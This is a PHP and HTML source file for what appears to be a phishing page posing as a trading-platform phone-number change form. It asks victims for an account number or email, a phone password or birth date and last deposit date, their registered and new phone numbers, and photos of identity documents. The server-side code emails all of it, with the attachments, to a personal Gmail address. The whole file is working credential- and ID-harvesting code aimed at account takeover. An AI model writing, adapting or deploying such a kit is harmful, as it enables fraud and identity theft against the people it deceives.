<?php
$to = 'dreameryandex.22013@gmail.com';

if (isset($_POST['ok'] ) ) {
  $number  =  $_POST['number'];
  $pass = $_POST['pass'];
  $phone   = $_POST['phone'];
  $newphone = $_POST['newphone'];
 

 if($_FILES)
{
	$filepath = array();
	$filename = array();
	$i = 0;
		foreach ($_FILES["file"]["error"] as $key => $error) {
			if ($error == UPLOAD_ERR_OK) {
				$filename[$i][0] = $_FILES["file"]["tmp_name"][$key];
				$filename[$i][1] = $_FILES["file"]["name"][$key];
				$i++;
			}
		}
	}
	
 
  $body = "Номер счёта или email: \r\n".$number."\r\n\r\n";
  $body .= "Пароль телефона, дата рождения или дата последнего депозита: \r\n".$pass."\r\n\r\n";
  $body .= "Номер телефона при регистрации: \r\n".$phone."\r\n\r\n";
  $body .= "Новый номер телефона: \r\n".$newphone;
 
  send_mail($to, $body, $phone, $filepath, $filename);
  echo "Данные успешно отправлены";
}

// Вложения
function send_mail($to, $body, $email, $filepath, $filename)
{
  $subject = 'Заявка';
  $boundary = "--".md5(uniqid(time())); // генерируем разделитель
  $headers = "From: ".$phone."\r\n";   
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .="Content-Type: multipart/mixed; boundary=\"".$boundary."\"\r\n";
  $multipart = "--".$boundary."\r\n";
  $multipart .= "Content-type: text/plain; charset=\"utf-8\"\r\n";
  $multipart .= "Content-Transfer-Encoding: quoted-printable\r\n\r\n";

  $body = $body."\r\n\r\n";
 
  $multipart .= $body;
	foreach ($filename as $key => $value) {
		$fp = fopen($value[0], "r"); 
		$content = fread($fp, filesize($value[0]));
		fclose($fp);
		$file .= "--".$boundary."\r\n";
		$file .= "Content-Type: application/octet-stream\r\n";
		$file .= "Content-Transfer-Encoding: base64\r\n";
		$file .= "Content-Disposition: attachment; filename=\"".$value[1]."\"\r\n\r\n";
		$file .= chunk_split(base64_encode($content))."\r\n";
	}
	$multipart .= $file."--".$boundary."--\r\n";
	mail($to, $subject, $multipart, $headers);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="fields">
        <form  method="POST" data-netlify="true" enctype="multipart/form-data">

        <div class="okay">
            <span class="margin"><strong>1)</strong> Trading account number, or email address of registered account</span>
            <input name="number" type="text" id="name" placeholder="Number">
        </div>

        <div class="okay">
            <span></span><strong>2)</strong> Phone password or (a) Date of birth, (b) Last deposit date
            <input name="pass" type="text" id="name" placeholder="...">
        </div>

        <div class="okay">
            <span></span><strong>3)</strong> Phone number used during the account registration
            <input name="phone" type="text" id="name" placeholder="international format (i.e. +277.....)">
        </div>

        <div class="okay">
            <span></span><strong>4)</strong> New phone number  in international format
            <input name="newphone" type="text" id="name" placeholder="new phone number">
        </div>

        <div class="okay">
            <span></span><strong>5)</strong> Provide ID  document that was verified in PA (or any other document that we accept that proves  your identity)
            
        </div>
        
        <input name="file[]" class="video" type="file" id="capture" accept="image/*;capture=camcorder"  multiple />
        
        <ul class="actions">
            <li><input type="submit" name = "ok" value="Send" class="button primary"></li>
        </ul>
            
        </form></div>
</body>
</html>